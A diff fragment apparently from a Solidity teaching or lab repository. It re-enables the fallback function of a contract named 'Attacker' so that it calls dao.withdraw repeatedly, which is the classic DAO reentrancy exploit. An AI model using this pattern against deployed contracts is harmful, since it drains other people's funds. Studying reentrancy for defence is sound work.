@@ -34,8 +34,8 @@ contract Attacker {
     }
 
     function()public payable {
-        // if(stack++ < stackLimit) {
-        //     dao.withdraw(amount);
-        // }
+         if(stack++ < stackLimit) {
+             dao.withdraw(amount);
+        }
     }
 }
